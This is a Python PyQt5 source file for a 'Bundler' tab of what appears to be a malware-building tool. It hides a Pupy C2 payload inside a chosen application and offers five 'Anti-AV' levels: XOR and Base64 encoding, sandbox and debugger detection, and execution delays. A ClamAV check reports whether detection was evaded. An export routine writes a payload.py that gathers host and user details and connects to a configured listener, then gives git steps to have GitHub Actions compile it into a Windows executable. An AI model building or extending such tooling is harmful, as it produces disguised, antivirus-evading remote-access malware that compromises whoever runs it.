#!/usr/bin/env python3
"""
Bundler Tab - Advanced Bundler with Pupy Integration
Application bundling interface with anti-AV obfuscation
"""

import os
import subprocess
from pathlib import Path

from PyQt5.QtWidgets import (
    QWidget,
    QVBoxLayout,
    QHBoxLayout,
    QLabel,
    QLineEdit,
    QPushButton,
    QComboBox,
    QFileDialog,
    QMessageBox,
    QProgressBar,
    QGroupBox,
    QSpinBox,
    QCheckBox,
    QFormLayout,
    QTextEdit,
)
from PyQt5.QtCore import QThread, pyqtSignal, Qt
from PyQt5.QtGui import QFont, QColor

# Import du bundler Pupy
try:
    from pupy_bundler import PupyBundler
    from pupy_obfuscated_payload import create_obfuscated_payload
except ImportError:
    print("[!] Warning: Pupy modules not found")


class BundlerWorker(QThread):
    """Worker thread for bundling with Pupy"""

    progress = pyqtSignal(str)
    finished = pyqtSignal(bool)

    def __init__(
        self,
        listener_ip,
        listener_port,
        obfuscation,
        platform="windows",
        app_name="pupy_payload"
    ):
        super().__init__()
        self.listener_ip = listener_ip
        self.listener_port = listener_port
        self.obfuscation = obfuscation
        self.platform = platform
        self.app_name = app_name

    def run(self):
        """Run bundling process with Pupy"""
        try:
            self.progress.emit(f"[*] === PUPY BUNDLER (Advanced Anti-AV) ===")
            self.progress.emit(f"[*] Listener: {self.listener_ip}:{self.listener_port}")
            self.progress.emit(f"[*] Platform: {self.platform}")
            self.progress.emit(f"[*] Obfuscation: {self.obfuscation}")

            # Convert obfuscation level
            try:
                obfuscation_level = int(self.obfuscation)
            except ValueError:
                obfuscation_map = {
                    "Level 1 - Base64": 1,
                    "Level 2 - XOR": 2,
                    "Level 3 - Sandbox Detection": 3,
                    "Level 4 - Dynamic Imports": 4,
                    "Level 5 - MAXIMUM": 5,
                    "Low": 1,
                    "Medium": 2,
                    "High": 3,
                    "Extreme": 4,
                    "Maximum": 5,
                }
                obfuscation_level = 2
                for key, value in obfuscation_map.items():
                    if key in str(self.obfuscation):
                        obfuscation_level = value
                        break

            self.progress.emit(f"\n[*] Obfuscation Level: {obfuscation_level}/5")
            
            # Afficher les détails du niveau
            levels = {
                1: "Base64 Encoding - Simple",
                2: "XOR + Base64 + Random Delays (⭐ RECOMMENDED)",
                3: "Sandbox Detection + Advanced Delays",
                4: "Dynamic Imports + Process Checking",
                5: "MAXIMUM - All tricks + 60-300s delays (⭐⭐⭐)",
            }
            self.progress.emit(f"[*] {levels.get(obfuscation_level, 'Unknown')}")

            self.progress.emit(f"\n[*] Creating Pupy bundler...")
            
            # Créer le bundler Pupy
            bundler = PupyBundler(
                listener_ip=self.listener_ip,
                listener_port=self.listener_port,
                obfuscation_level=obfuscation_level,
                platform=self.platform
            )

            self.progress.emit(f"[*] Generating obfuscated Pupy payload...")
            self.progress.emit(f"[*] Payload will be hidden inside the executable")
            
            # Bundler
            success = bundler.bundle(output_name=self.app_name)

            if success:
                self.progress.emit(f"\n" + "="*70)
                self.progress.emit(f"✅ BUNDLING SUCCESSFUL!")
                self.progress.emit(f"="*70)
                self.progress.emit(f"\n[+] Your Pupy C2 payload is ready!")
                self.progress.emit(f"[+] Location: dist/{self.app_name}")
                if self.platform == "windows":
                    self.progress.emit(f"[+] File: dist/{self.app_name}.exe")
                self.progress.emit(f"\n[+] Pupy is completely hidden inside the executable")
                self.progress.emit(f"[+] Anti-AV level: {obfuscation_level}/5")
                self.finished.emit(True)
            else:
                self.progress.emit(f"\n[!] Bundling failed")
                self.finished.emit(False)

        except Exception as e:
            self.progress.emit(f"[!] ERROR: {str(e)}")
            import traceback
            self.progress.emit(f"[!] Traceback: {traceback.format_exc()}")
            self.finished.emit(False)


class BundlerTab(QWidget):
    """Bundler tab widget"""

    def __init__(self, parent):
        super().__init__()
        self.parent = parent
        self.bundler_worker = None
        self.init_ui()

    def init_ui(self):
        """Initialize UI"""
        layout = QVBoxLayout(self)

        # ===== Input Section =====
        input_group = QGroupBox("📦 Application Configuration")
        input_layout = QFormLayout()

        # App selection
        app_layout = QHBoxLayout()
        self.app_path_input = QLineEdit()
        self.app_path_input.setPlaceholderText("Select application to bundle...")
        browse_btn = QPushButton("Browse")
        browse_btn.clicked.connect(self.browse_app)
        app_layout.addWidget(self.app_path_input)
        app_layout.addWidget(browse_btn)
        input_layout.addRow("Application:", app_layout)

        # App name
        self.app_name_input = QLineEdit()
        self.app_name_input.setPlaceholderText("MyApp")
        self.app_name_input.setText("MyApp")
        input_layout.addRow("Output Name:", self.app_name_input)

        # Target Platform
        platform_label = QLabel("🖥️  Target Platform:")
        platform_label.setStyleSheet("font-weight: bold;")
        self.platform_combo = QComboBox()
        self.platform_combo.addItems(
            [
                "Windows (.exe)",
                "macOS (.app)",
                "Linux (binary)",
                "All Platforms (3 in 1)",
            ]
        )
        self.platform_combo.setCurrentIndex(0)  # Default Windows
        self.platform_combo.currentTextChanged.connect(self.on_platform_changed)
        # STYLE: Make combobox more visible and clickable
        self.platform_combo.setMinimumHeight(36)
        self.platform_combo.setMinimumWidth(250)
        self.platform_combo.setStyleSheet(
            """
            QComboBox {
                border: 2px solid #4CAF50;
                border-radius: 5px;
                padding: 8px 12px;
                background-color: #ffffff;
                color: #000000;
                font-size: 13px;
                font-weight: 500;
            }
            QComboBox:focus {
                border: 2px solid #2d8a2d;
                background-color: #f5fff5;
            }
            QComboBox::drop-down {
                border: none;
                width: 30px;
                background-color: #4CAF50;
                border-top-right-radius: 3px;
                border-bottom-right-radius: 3px;
            }
            QComboBox::down-arrow {
                image: none;
                width: 14px;
                height: 14px;
                color: white;
            }
            QComboBox:hover {
                background-color: #f9fff9;
                border: 2px solid #45a049;
            }
            QComboBox QAbstractItemView {
                border: 1px solid #4CAF50;
                background-color: white;
                selection-background-color: #4CAF50;
                selection-color: white;
            }
        """
        )
        input_layout.addRow(platform_label, self.platform_combo)

        # Listener IP
        self.listener_ip_input = QLineEdit()
        self.listener_ip_input.setText(self.parent.config.get("listener_ip", "0.0.0.0"))
        input_layout.addRow("Listener IP:", self.listener_ip_input)

        # Listener Port
        self.listener_port_spinbox = QSpinBox()
        self.listener_port_spinbox.setValue(
            int(self.parent.config.get("listener_port", 4444))
        )
        self.listener_port_spinbox.setMinimum(1)
        self.listener_port_spinbox.setMaximum(65535)
        input_layout.addRow("Listener Port:", self.listener_port_spinbox)

        # Obfuscation level - IMPROVED with better UI
        obf_group = QGroupBox("🔐 Anti-AV Configuration")
        obf_layout = QVBoxLayout()

        # Level selector with radio buttons or better combo
        level_layout = QHBoxLayout()
        self.level_label = QLabel("Anti-AV Level:")
        self.level_label.setStyleSheet("font-weight: bold;")

        self.obfuscation_combo = QComboBox()
        level_descriptions = {
            "Level 1 - Low": "Base64 encoding only (Dev only)",
            "Level 2 - Medium": "XOR + Base64 + Timing (⭐ Recommended)",
            "Level 3 - High": "Sandbox detection + Anti-debug",
            "Level 4 - Extreme": "Dynamic imports + Process check",
            "Level 5 - Maximum": "All techniques + 1-5min delays",
        }

        self.obfuscation_combo.addItems(list(level_descriptions.keys()))
        self.obfuscation_combo.setCurrentIndex(1)  # Default Level 2
        self.obfuscation_combo.setMinimumWidth(300)
        self.obfuscation_combo.setMinimumHeight(36)  # Make it bigger
        # STYLE: Make combobox more visible and clickable
        self.obfuscation_combo.setStyleSheet(
            """
            QComboBox {
                border: 2px solid #2196F3;
                border-radius: 5px;
                padding: 8px 12px;
                background-color: #ffffff;
                color: #000000;
                font-size: 13px;
                font-weight: 500;
            }
            QComboBox:focus {
                border: 2px solid #0d47a1;
                background-color: #f3f7ff;
            }
            QComboBox::drop-down {
                border: none;
                width: 30px;
                background-color: #2196F3;
                border-top-right-radius: 3px;
                border-bottom-right-radius: 3px;
            }
            QComboBox::down-arrow {
                image: none;
                width: 14px;
                height: 14px;
                color: white;
            }
            QComboBox:hover {
                background-color: #f3f7ff;
                border: 2px solid #1976D2;
            }
            QComboBox QAbstractItemView {
                border: 1px solid #2196F3;
                background-color: white;
                selection-background-color: #2196F3;
                selection-color: white;
            }
        """
        )
        self.obfuscation_combo.currentTextChanged.connect(self.on_level_changed)

        level_layout.addWidget(self.level_label)
        level_layout.addWidget(self.obfuscation_combo)
        level_layout.addStretch()

        obf_layout.addLayout(level_layout)

        # Description label
        self.level_desc = QLabel(
            "XOR encryption + Base64 encoding + 1-3s delays • Fast & effective"
        )
        self.level_desc.setStyleSheet("color: #666; font-style: italic;")
        obf_layout.addWidget(self.level_desc)

        # Features list
        self.level_features = QLabel("✓ XOR encryption  ✓ Base64  ✓ Timing evasion")
        self.level_features.setStyleSheet("color: #008000; margin-top: 5px;")
        obf_layout.addWidget(self.level_features)

        obf_group.setLayout(obf_layout)

        # Create a dummy widget to add the entire groupbox as a row spanning both columns
        dummy_row = QWidget()
        dummy_layout = QVBoxLayout(dummy_row)
        dummy_layout.setContentsMargins(0, 0, 0, 0)
        dummy_layout.addWidget(obf_group)
        input_layout.addRow(dummy_row)

        # Auto test AV
        self.auto_test_av_check = QCheckBox("Auto-test with ClamAV")
        self.auto_test_av_check.setChecked(self.parent.config.get("auto_test_av", True))
        input_layout.addRow("Anti-AV Testing:", self.auto_test_av_check)

        input_group.setLayout(input_layout)
        layout.addWidget(input_group)

        # ===== Action Buttons =====
        button_layout = QHBoxLayout()

        self.bundle_btn = QPushButton("🚀 Bundle & Compile")
        self.bundle_btn.clicked.connect(self.start_bundling)
        self.bundle_btn.setStyleSheet(
            "background-color: #4CAF50; color: white; font-weight: bold; padding: 10px;"
        )
        button_layout.addWidget(self.bundle_btn)

        self.validate_btn = QPushButton("✅ Validate Anti-AV")
        self.validate_btn.clicked.connect(self.validate_antivirus)
        button_layout.addWidget(self.validate_btn)

        self.open_output_btn = QPushButton("📁 Open Output")
        self.open_output_btn.clicked.connect(self.open_output)
        button_layout.addWidget(self.open_output_btn)

        self.export_github_btn = QPushButton("📤 Export pour GitHub Actions")
        self.export_github_btn.clicked.connect(self.export_for_github)
        self.export_github_btn.setStyleSheet(
            "background-color: #FF6B35; color: white; font-weight: bold; padding: 10px;"
        )
        button_layout.addWidget(self.export_github_btn)

        layout.addLayout(button_layout)

        # ===== Progress Section =====
        progress_group = QGroupBox("📊 Progress & Output")
        progress_layout = QVBoxLayout()

        self.progress_bar = QProgressBar()
        self.progress_bar.setVisible(False)
        progress_layout.addWidget(self.progress_bar)

        self.output_text = QTextEdit()
        self.output_text.setReadOnly(True)
        self.output_text.setFont(QFont("Courier", 10))
        progress_layout.addWidget(self.output_text)

        progress_group.setLayout(progress_layout)
        layout.addWidget(progress_group)

    def on_level_changed(self, text):
        """Update level description when changed"""
        try:
            descriptions = {
                "Level 1 - Low": (
                    "Base64 encoding only • <1s",
                    "✓ Simple obfuscation  ✓ Quick compilation",
                    "⚠️  Detectable by most AV",
                ),
                "Level 2 - Medium": (
                    "XOR + Base64 + 1-3s timing • RECOMMENDED ⭐",
                    "✓ XOR encryption  ✓ Base64  ✓ Timing evasion  ✓ Fast",
                    "✓ Good detection bypass",
                ),
                "Level 3 - High": (
                    "Sandbox detection + Anti-debug + 5-15s delays",
                    "✓ VM detection  ✓ Debugger check  ✓ Long timing",
                    "✓ Evades defensive environments",
                ),
                "Level 4 - Extreme": (
                    "Dynamic imports + Process checking + threading",
                    "✓ Anti-analysis  ✓ Process detection  ✓ Tool detection",
                    "✓ Professional AV evasion",
                ),
                "Level 5 - Maximum": (
                    "All techniques + 60-300s delays + complete obfuscation",
                    "✓ Maximum evasion  ✓ Multi-layer sandbox check",
                    "⚠️  Very slow execution (1-5 minutes)",
                ),
            }

            if text in descriptions:
                desc, features, note = descriptions[text]
                if hasattr(self, "level_desc") and self.level_desc:
                    self.level_desc.setText(desc)
                if hasattr(self, "level_features") and self.level_features:
                    self.level_features.setText(features)
        except Exception as e:
            print(f"Error in on_level_changed: {e}")

    def on_platform_changed(self, text):
        """Update platform description when changed"""
        try:
            descriptions = {
                "Windows (.exe)": "⚙️ Windows EXE executable • Universal compatibility",
                "macOS (.app)": "🍎 macOS App Bundle • Native application",
                "Linux (binary)": "🐧 Linux ELF binary • Unix compatible",
                "All Platforms (3 in 1)": "🌐 Generate all 3 formats simultaneously",
            }
            if (
                text in descriptions
                and hasattr(self, "output_text")
                and self.output_text
            ):
                self.output_text.append(f"\n[*] Platform: {descriptions[text]}")
        except Exception as e:
            print(f"Error in on_platform_changed: {e}")

    def browse_app(self):
        """Browse for application file"""
        file_path, _ = QFileDialog.getOpenFileName(
            self,
            "Select Application",
            str(Path.home()),
            "All Files (*);;Python Files (*.py);;Executables (*.exe)",
        )
        if file_path:
            self.app_path_input.setText(file_path)
            if not self.app_name_input.text() or self.app_name_input.text() == "MyApp":
                app_name = Path(file_path).stem
                self.app_name_input.setText(app_name)

    def start_bundling(self):
        """Start bundling process with Pupy"""
        
        # Validate listener IP
        listener_ip = self.listener_ip_input.text().strip()
        listener_port = self.listener_port_spinbox.value()
        
        if not listener_ip:
            QMessageBox.warning(self, "Error", "Please enter listener IP")
            return
        
        if listener_port <= 0 or listener_port > 65535:
            QMessageBox.warning(self, "Error", "Invalid port (1-65535)")
            return

        # Disable button during bundling
        self.bundle_btn.setEnabled(False)
        self.progress_bar.setVisible(True)
        self.output_text.clear()
        
        self.output_text.append("[*] ========== PUPY BUNDLER (Advanced) ==========")
        self.output_text.append(f"[*] Listener IP: {listener_ip}")
        self.output_text.append(f"[*] Listener Port: {listener_port}")
        self.output_text.append(f"[*] Obfuscation: {self.obfuscation_combo.currentText()}")
        self.output_text.append(f"[*] Platform: {self.platform_combo.currentText()}")
        self.output_text.append("[*] ================================================")
        self.output_text.append("")

        # Extract level number
        current_text = self.obfuscation_combo.currentText()
        try:
            level_num = int(current_text.split()[1])
        except:
            level_num = 2

        # Get platform
        platform_text = self.platform_combo.currentText()
        platform_map = {
            "Windows (.exe)": "windows",
            "macOS (.app)": "macos",
            "Linux (binary)": "linux",
        }
        platform = platform_map.get(platform_text, "windows")

        # Create worker
        self.bundler_worker = BundlerWorker(
            listener_ip=listener_ip,
            listener_port=listener_port,
            obfuscation=str(level_num),
            platform=platform,
            app_name="pupy_payload"
        )

        self.bundler_worker.progress.connect(self.on_progress)
        self.bundler_worker.finished.connect(self.on_bundling_finished)
        self.bundler_worker.start()

    def on_progress(self, message):
        """Handle progress update"""
        self.output_text.append(message)
        self.parent.log(message)

    def on_bundling_finished(self, success):
        """Handle bundling completion"""
        self.bundle_btn.setEnabled(True)
        self.progress_bar.setVisible(False)

        if success:
            QMessageBox.information(
                self, "Success", "Application bundled successfully!"
            )
        else:
            QMessageBox.critical(
                self, "Error", "Bundling failed. Check output for details"
            )

    def validate_antivirus(self):
        """Validate with antivirus - improved"""
        # Look in dist/ directory (where PyInstaller puts binaries)
        output_base = Path.home() / "Pupy_Outputs"
        dist_dir = output_base / "dist"

        # Find exe files in dist directory
        exe_files = []
        if dist_dir.exists():
            exe_files = list(dist_dir.glob("*"))
            # Filter for executable files (not directories)
            exe_files = [
                f for f in exe_files if f.is_file() and not f.name.startswith(".")
            ]

        if not exe_files:
            self.output_text.append(
                "[!] No executables found in /Users/kalilbelgoumri/Pupy_Outputs/dist/"
            )
            self.output_text.append(
                "[!] Have you bundled an app yet? Click 'Bundle & Compile' first!"
            )
            QMessageBox.warning(
                self,
                "Error",
                f"No executable found in dist/ directory.\n\n"
                f"Expected location: {dist_dir}\n\n"
                f"Steps:\n"
                f"1. Select an application\n"
                f"2. Click 'Bundle & Compile'\n"
                f"3. Wait for completion\n"
                f"4. Then click 'Validate Anti-AV'",
            )
            return

        # Show available files
        self.output_text.append(f"\n[+] Found {len(exe_files)} executable(s):")
        for exe in exe_files:
            size_mb = exe.stat().st_size / 1024 / 1024
            # Detect platform from file
            platform_info = ""
            if exe.name.endswith(".exe"):
                platform_info = " (Windows .exe or macOS binary with .exe extension)"
            else:
                platform_info = " (macOS/Linux binary)"
            self.output_text.append(
                f"    - {exe.name} ({size_mb:.2f} MB){platform_info}"
            )

        target_exe = exe_files[0]  # Use first one
        self.output_text.append(f"\n[*] Testing: {target_exe.name}")
        size_mb = target_exe.stat().st_size / 1024 / 1024
        self.output_text.append(f"[*] Size: {size_mb:.2f} MB")

        # Detect and display platform info
        if target_exe.name.endswith(".exe"):
            self.output_text.append(
                "[*] Format: Windows .exe (or macOS binary with extension)"
            )
        else:
            self.output_text.append("[*] Format: macOS/Linux binary (no extension)")

        # Try ClamAV
        self.output_text.append(f"\n[*] Scanning with ClamAV...")
        try:
            result = subprocess.run(
                ["clamscan", "-r", "-i", str(target_exe)],
                capture_output=True,
                text=True,
                timeout=120,
            )

            self.output_text.append(result.stdout)

            if result.returncode == 0:
                self.output_text.append("\n[+] ✅ File NOT detected by ClamAV!")
                self.output_text.append("[+] Anti-AV evasion working!")
            else:
                self.output_text.append("\n[!] ⚠️  File detected by ClamAV")
                self.output_text.append("[!] Try increasing Anti-AV level (3, 4, or 5)")

        except FileNotFoundError:
            self.output_text.append("[!] ClamAV not installed")
            self.output_text.append("[*] Install: brew install clamav")
            self.output_text.append("[*] Or update definitions: freshclam")

        except subprocess.TimeoutExpired:
            self.output_text.append("[!] ClamAV scan timed out")

        except Exception as e:
            self.output_text.append(f"[!] Error: {e}")

        # Additional analysis
        self.output_text.append(f"\n[*] Additional checks:")
        try:
            # Check strings
            result = subprocess.run(
                ["strings", str(target_exe)],
                capture_output=True,
                text=True,
                timeout=10,
            )

            # Look for suspicious patterns
            suspicious = 0
            if "socket" in result.stdout.lower():
                suspicious += 1
            if "connect" in result.stdout.lower():
                suspicious += 1

            self.output_text.append(f"  - Suspicious strings found: {suspicious}")

        except:
            pass

    def open_output(self):
        """Open output directory"""
        output_dir = Path.home() / "Pupy_Outputs"
        if output_dir.exists():
            os.system(f"open '{output_dir}'")
        else:
            QMessageBox.information(self, "Info", "Output directory doesn't exist yet")

    def export_for_github(self):
        """Export payload.py to root with correct listener configuration"""
        try:
            # Get the CURRENT values from the app UI
            listener_ip = self.listener_ip_input.text().strip()
            listener_port = self.listener_port_spinbox.value()

            # Validate
            if not listener_ip:
                raise Exception("Listener IP is empty!")
            if listener_port <= 0 or listener_port > 65535:
                raise Exception(f"Invalid port: {listener_port}")

            self.output_text.append("[*] Creating payload with app configuration...")
            self.output_text.append(f"[*] IP: {listener_ip}")
            self.output_text.append(f"[*] Port: {listener_port}")

            # Create payload with CORRECT config from the app
            payload_code = f'''#!/usr/bin/env python3
"""
Payload - Pupy C2
Listener: {listener_ip}:{listener_port}
"""

import socket
import platform
import os

def get_system_info():
    """Get system information"""
    return {{
        'hostname': platform.node(),
        'platform': platform.system(),
        'user': os.getenv('USER', 'unknown'),
        'ip': '{listener_ip}',
        'port': {listener_port}
    }}

def connect_listener():
    """Connect to listener"""
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.connect(('{listener_ip}', {listener_port}))
        s.close()
        return True
    except:
        return False

if __name__ == '__main__':
    info = get_system_info()
    print(f"[+] System Info: {{info}}")
    if connect_listener():
        print(f"[+] Connected to {{'{listener_ip}:{listener_port}'")
    else:
        print("[-] Connection failed")
'''

            # Write to workspace root
            workspace_root = Path.cwd()
            payload_path = workspace_root / "payload.py"
            payload_path.write_text(payload_code)

            self.output_text.append(f"\n✅ Payload created successfully!")
            self.output_text.append(f"✅ Location: {payload_path}")
            self.output_text.append(f"✅ IP: {listener_ip}")
            self.output_text.append(f"✅ Port: {listener_port}")

            # Verify file
            with open(payload_path, "r") as f:
                content = f.read()
                if str(listener_ip) in content and str(listener_port) in content:
                    self.output_text.append(
                        f"\n✅ Payload verified - Config is CORRECT!"
                    )
                else:
                    self.output_text.append(
                        f"\n⚠️  Warning: Config might not be in payload"
                    )

            self.output_text.append("\n" + "=" * 70)
            self.output_text.append("📤 EXPORT COMPLETE - READY FOR GITHUB!")
            self.output_text.append("=" * 70)
            self.output_text.append(f"\nPayload Configuration:")
            self.output_text.append(f"  Listener IP: {listener_ip}")
            self.output_text.append(f"  Listener Port: {listener_port}")
            self.output_text.append(f"\nNext Steps:")
            self.output_text.append(f"  1. git add payload.py")
            self.output_text.append(
                f"  2. git commit -m 'Payload {listener_ip}:{listener_port}'"
            )
            self.output_text.append(f"  3. git push")
            self.output_text.append(f"\nGitHub Actions will compile to Windows PE x64!")
            self.output_text.append("=" * 70)

            QMessageBox.information(
                self,
                "✅ Payload Exported!",
                f"Payload created with correct configuration!\n\n"
                f"Listener IP: {listener_ip}\n"
                f"Listener Port: {listener_port}\n\n"
                f"Next:\n"
                f"1. git add payload.py\n"
                f"2. git commit -m 'Payload'\n"
                f"3. git push\n\n"
                f"GitHub Actions compiles in 2-3 min!",
            )

        except Exception as e:
            error_msg = str(e)
            self.output_text.append(f"[!] ERROR: {error_msg}")
            QMessageBox.critical(
                self,
                "❌ Export Failed",
                f"Error: {error_msg}\n\n"
                f"Please check:\n"
                f"- Listener IP is set\n"
                f"- Port is valid (1-65535)",
            )
